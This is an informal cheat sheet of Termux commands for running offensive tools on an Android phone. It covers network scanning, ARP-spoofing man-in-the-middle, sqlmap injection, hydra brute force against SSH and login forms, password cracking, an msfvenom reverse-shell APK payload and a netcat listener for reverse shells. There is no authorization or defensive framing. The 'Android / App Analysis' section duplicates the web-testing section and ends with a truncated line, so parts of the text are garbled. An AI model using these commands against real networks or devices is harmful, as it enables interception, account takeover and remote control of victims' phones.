
1setup

pkg update && pkg upgrade -y
pkg install -y python git curl wget unzip openssh nmap whois
pkg install -y root-repo && pkg install -y tcpdump   # needs root for capture
termux-setup-storage

2Network Recon

Your network info
ifconfig wlan0
ip route
ip neigh                  # ARP table (devices on LAN)

# Host discovery
nmap -sn 192.168.1.0/24
nmap -sV -O -A 192.168.1.1          # detailed scan of gateway
nmap -p- --open 192.168.1.100       # full port scan
nmap --script vuln 192.168.1.100

3 Wireless (requires root / custom kernel with monitor mode)
iw dev wlan0 info
tcpdump -i wlan0 -w capture.pcap

4 MITM (rooted device or hot-spot control)

pkg install -y mitmproxy
mitmproxy -p 8080                   # then set phone proxy to 127.0.0.1:8080

# arp-spoofing via ettercap-style tools
pkg install -y arpspoof
arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1

5 Web / API Testing

 nikto
git clone https://github.com/sullo/nikto && cd nikto/program
python nikto.pl -h http://target

# sqlmap
pkg install -y sqlmap
sqlmap -u "http://target/page.php?id=1" --batch --dbs

# dirsearch / gobuster
pkg install -y dirsearch
dirsearch -u http://target -e php,html,txt

# curl / http toolkit
curl -I http://target
whatweb http://target

6 Android / App Analysis

 nikto
git clone https://github.com/sullo/nikto && cd nikto/program
python nikto.pl -h http://target

# sqlmap
pkg install -y sqlmap
sqlmap -u "http://target/page.php?id=1" --batch --dbs

# dirsearch / gobuster
pkg install -y dirsearch
dirsearch -u http://target -e php,html,txt

# curl / http toolkit
curl -I http://target
whatweb http://targe

7 Brute Force / Password

pkg install -y hydra
hydra -l admin -P rockyou.txt target.com ssh -t 4
hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:failed-string"

# hash cracking
pkg install -y hashcat john
john --wordlist=rockyou.txt hash.txt

8Exploitation / Metasploit

pkg install -y unstable-repo
pkg install -y metasploit
msfconsole
# e.g. msfvenom payload for Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -o test.apk

9Useful Extras

pkg install -y netcat-openbsd socat
nc -lvnp 4444                       # listener for reverse shells
pkg install -y wireshark-cli tshark # packet analysis
python3 -m http.server 8000         # quick file serving
ss -tulpn                           # listening ports